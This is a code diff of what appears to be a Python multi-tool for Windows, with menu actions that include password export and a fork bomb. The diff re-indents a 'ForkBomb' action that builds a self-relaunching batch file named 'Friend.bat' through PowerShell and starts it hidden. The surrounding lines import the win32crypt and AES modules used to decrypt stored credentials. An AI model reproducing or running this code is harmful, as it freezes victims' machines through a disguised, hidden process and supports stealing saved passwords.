@@ -597,7 +597,7 @@ while True:
         
         try:
             import win32crypt  # type: ignore
-            from Crypto.Cipher import AES
+            from Crypto.Cipher import AES #type:ignore
         except ImportError:
             print(Fore.RED + "[!] Install packages:")
             print(Fore.YELLOW + "pip install pywin32 pycryptodome")
@@ -824,50 +824,37 @@ while True:
         print("")
         sleep(0.1)
 
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
 
 
-if action == "ForkBomb":
-    logging.info(f"Chosen to attempt a forkbomb")
-    # Create the fork bomb batch file
-    run_ps('New-Item -Path "Friend.bat" -ItemType File -Force')
-    run_ps('Set-Content -Path "Friend.bat" -Value "@echo off"')
-    run_ps('Add-Content -Path "Friend.bat" -Value ":A"')
-    run_ps('Add-Content -Path "Friend.bat" -Value "start %0"')
-    run_ps('Add-Content -Path "Friend.bat" -Value "goto A"')
-    
-    # Execute it
-    run_ps('Start-Process -FilePath "Friend.bat" -WindowStyle Hidden')
+    if action == "ForkBomb":
+        logging.info(f"Chosen to attempt a forkbomb")
+        # Create the fork bomb batch file
+        run_ps('New-Item -Path "Friend.bat" -ItemType File -Force')
+        run_ps('Set-Content -Path "Friend.bat" -Value "@echo off"')
+        run_ps('Add-Content -Path "Friend.bat" -Value ":A"')
+        run_ps('Add-Content -Path "Friend.bat" -Value "start %0"')
+        run_ps('Add-Content -Path "Friend.bat" -Value "goto A"')
+        
+        # Execute it
+        run_ps('Start-Process -FilePath "Friend.bat" -WindowStyle Hidden')
         
         
 
 
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
+    #
+    #
+    #
+    #
+    #
+    #
+    #
+    #
+    #
+    # 
+    #Action exit = exiting the program
+        if action == "exit":
+            logging.info(f"Chosen action PassExport to exit the program")
+            print("Exiting the program...")
+            sleep(3)
 
-    
-    
-#Action exit = exiting the program
-    if action == "exit":
-        logging.info(f"Chosen action PassExport to exit the program")
-        print("Exiting the program...")
-        sleep(3)
-
-        exit()
+            exit()
